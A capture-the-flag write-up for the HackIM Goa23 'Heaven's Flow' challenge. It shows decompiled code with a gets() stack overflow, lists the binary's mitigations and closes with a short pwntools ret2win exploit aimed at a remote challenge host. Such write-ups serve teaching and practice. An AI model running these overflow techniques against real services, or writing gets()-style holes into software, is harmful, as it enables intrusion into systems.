# PWN CHALLENGES from HACKIM GOA23

## Heaven's Flow

<b>We are given as 64 Bit ELF Binary that is linked with libc version equal or higher than 2.34 .So we have to patch it if we have lower libc versions </b>

Here is the important part of the decompiled code of the main function where the bug is:- 

```c
  char local_218 [524];
  int local_c;
  
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  puts("Welcome to heaven!");
  puts("what would you like to do here:");
  printf(" 1. rest\n 2. have fun\n 3. relive a memory\n 4. get the flag\n>>");
  gets(local_218);
```



At  the very last line of the code snippet is they have used **gets** function which is vulnerable to buffer overflow because it doesn't have size parameter which limits the number of characters being read.

And there is a suspicious looking function in the binary :-**heavens secret**

```c
void heavens_secret(void)

{
  int iVar1;
  FILE *__stream;
  
  __stream = fopen("flag.txt","r");
  do {
    iVar1 = fgetc(__stream);
    putchar((int)(char)iVar1);
  } while ((char)iVar1 != -1);
  fclose(__stream);
  return;
}
```

This functions job is super simple . It opens the flag file and print out its content.



So it's basically a **ret2win** challenge where we have to overflow the buffer and tamper the return address with this function .

Let's first analyse the security mitigations present in the binary  to decide on our approach for this challenge

| Mitigation   | Stance            |
| ------------ | ----------------- |
| RELRO        | Partial RELRO     |
| Stack Canary | No Canary Found   |
| NX           | NX Enabled        |
| PIE          | No PIE (0x400000) |

No serious mitigations present in this challenge . So we will proceed to the simple ret2win technique.

The buffer along with the padding and base pointer address will sum upto 536 characters after anything that will tamper the stored return address.

The exploit for the challenge is :-

```python
#!/usr/bin/env python3

from pwn import *

e = ELF("./heaven_patched")
r = remote("52.59.124.14",10050)
exploit = b"A" * 536 + p64(e.sym.heavens_secret)
r.sendline(exploit)
r.interactive()
```

